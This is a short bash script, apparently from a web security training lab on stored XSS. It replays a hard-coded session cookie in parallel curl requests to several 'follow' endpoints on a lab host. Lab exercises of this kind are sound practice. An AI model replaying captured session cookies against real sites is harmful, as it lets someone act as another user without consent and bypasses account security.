#!/bin/bash
COOKIE="session=3RJ5sp5dX26P3MvO6g-1Ij1o8Nw1uynqn-g0K5YAg2A.AZEeRu6s4gQQZsIskAP0Wq2FkO8"
# Try both URL styles at once for maximum speed
curl -s -b "$COOKIE" "http://web0x01.hbtn/a3/xss_stored/follow/811152675" &
curl -s -b "$COOKIE" "http://web0x01.hbtn/a3/xss_stored/follow/918203" &
curl -s -b "$COOKIE" "http://web0x01.hbtn/a3/xss_stored/follow/32781850" &
wait
